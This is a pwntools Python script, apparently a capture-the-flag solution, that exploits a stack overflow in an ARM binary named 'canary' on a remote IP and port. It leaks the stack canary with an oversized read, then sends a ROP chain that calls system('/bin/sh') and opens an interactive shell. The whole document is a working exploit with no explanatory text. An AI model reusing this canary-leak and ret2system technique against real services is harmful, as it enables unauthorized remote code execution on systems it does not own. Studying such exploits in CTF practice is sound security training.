from pwn import *

target = ELF('./canary')
POP_R0_R4 = 0x26b7c
BINSH = 0x71eb0

# r = process('./canary')
r = remote('116.203.30.62', 18113)

r.sendafter('> ', 'A' * 0x29)

CANARY = '\x00' + r.recvline().strip()[-3:]

payload = ''
payload += 'A' * 0x28
payload += CANARY
payload += 'A' * 0xc
payload += p32(POP_R0_R4)
payload += p32(BINSH)
payload += p32(0)
payload += p32(target.symbols['system'])

r.sendlineafter('> ', payload)
r.sendline('')

r.interactive()
